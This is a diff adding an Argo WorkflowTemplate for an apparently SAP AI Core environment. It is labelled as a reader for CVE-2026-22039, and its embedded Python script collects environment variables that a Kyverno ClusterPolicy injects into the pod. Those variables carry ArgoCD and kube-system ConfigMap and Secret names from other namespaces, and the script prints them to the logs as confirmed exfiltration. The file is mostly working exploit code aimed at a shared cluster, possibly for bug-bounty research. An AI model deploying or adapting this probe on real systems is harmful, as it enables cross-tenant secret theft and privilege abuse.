@@ -1,0 +1,49 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: probe-train-v13
+  labels:
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
+    executables.ai.sap.com/name: "probe-train-v13"
+    executables.ai.sap.com/description: "CVE-2026-22039 ClusterPolicy exfil reader"
+spec:
+  templates:
+  - name: probe
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        python3 - << 'EOF'
+        import os
+
+        def report(k, v):
+            print(f"[PT13] {k}: {str(v)[:50000]}", flush=True)
+
+        report("START", "probe-train-v13 - ClusterPolicy exfil reader")
+
+        argocd_cm      = os.environ.get("KYVERNO_EXFIL_ARGOCD_CM", "")
+        argocd_secrets = os.environ.get("KYVERNO_EXFIL_ARGOCD_SECRETS", "")
+        kubesys_cm     = os.environ.get("KYVERNO_EXFIL_KUBESYS_CM", "")
+        kubesys_secrets= os.environ.get("KYVERNO_EXFIL_KUBESYS_SECRETS", "")
+
+        if any([argocd_cm, argocd_secrets, kubesys_cm, kubesys_secrets]):
+            report("CVE_2026_22039_STATUS", "CONFIRMED -- ClusterPolicy mutated pod with cross-namespace data")
+            report("ARGOCD_CONFIGMAP_NAMES",   argocd_cm)
+            report("ARGOCD_SECRET_NAMES",      argocd_secrets)
+            report("KUBESYS_CONFIGMAP_NAMES",  kubesys_cm)
+            report("KUBESYS_SECRET_NAMES",     kubesys_secrets)
+        else:
+            report("CVE_2026_22039_STATUS", "NOT_CONFIRMED -- no KYVERNO_EXFIL_* env vars present")
+            report("DIAGNOSIS", "ClusterPolicy either not deployed, not matching, or Kyverno SA lacks access")
+
+        for k in sorted(os.environ):
+            if any(x in k for x in ["KYVERNO", "EXFIL", "ARGOCD", "KUBESYS"]):
+                report(f"ENV_{k}", os.environ[k][:5000])
+
+        report("DONE", "probe-train-v13 complete")
+        EOF
+  entrypoint: probe
